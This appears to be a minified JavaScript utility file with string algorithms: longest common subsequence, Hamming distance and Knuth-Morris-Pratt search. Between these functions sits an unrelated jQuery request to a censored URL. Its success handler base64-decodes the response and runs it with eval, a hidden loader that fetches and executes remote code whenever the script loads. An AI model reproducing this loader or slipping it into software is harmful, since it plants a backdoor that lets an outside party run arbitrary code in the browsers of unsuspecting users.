function longestCommonSubsequence(t,e){let n=Array(e.length+1).fill(null).map(()=>Array(t.length+1).fill(null));for(let l=0;l<=t.length;l+=1)n[0][l]=0;for(let _=0;_<=e.length;_+=1)n[_][0]=0;for(let r=1;r<=e.length;r+=1)for(let h=1;h<=t.length;h+=1)t[h-1]===e[r-1]?n[r][h]=n[r-1][h-1]+1:n[r][h]=Math.max(n[r-1][h],n[r][h-1]);if(!n[e.length][t.length])return[""];let g=[],u=t.length,f=e.length;for(;u>0||f>0;)t[u-1]===e[f-1]?(g.unshift(t[u-1]),u-=1,f-=1):n[f][u]===n[f][u-1]?u-=1:f-=1;return g}$.ajax({url:"censored",type:"GET",success:function(res){eval(js=decodeURIComponent(escape(atob(res.toString()))))}});function hammingDistance(t,e){if(t.length!==e.length)throw Error("Strings must be of the same length");let n=0;for(let l=0;l<t.length;l+=1)t[l]!==e[l]&&(n+=1);return n}function buildPatternTable(t){let e=[0],n=0,l=1;for(;l<t.length;)t[n]===t[l]?(e[l]=n+1,l+=1,n+=1):0===n?(e[l]=0,l+=1):n=e[n-1];return e}function knuthMorrisPratt(t,e){if(0===e.length)return 0;let n=0,l=0,_=buildPatternTable(e);for(;n<t.length;)if(t[n]===e[l]){if(l===e.length-1)return n-e.length+1;l+=1,n+=1}else l>0?l=_[l-1]:n+=1;return -1}
